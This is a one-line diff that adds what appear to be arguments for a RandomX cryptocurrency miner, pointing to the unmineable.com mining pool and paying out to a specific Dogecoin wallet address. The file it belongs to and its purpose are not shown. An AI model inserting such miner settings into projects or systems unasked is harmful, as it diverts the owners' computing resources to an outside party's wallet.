@@ -1,0 +1,1 @@
+-o rx.unmineable.com:3333 -a rx -k -u DOGE:DQva3PHmz9vBYsW3QgjVq3FVaoYuJM4Mug -px
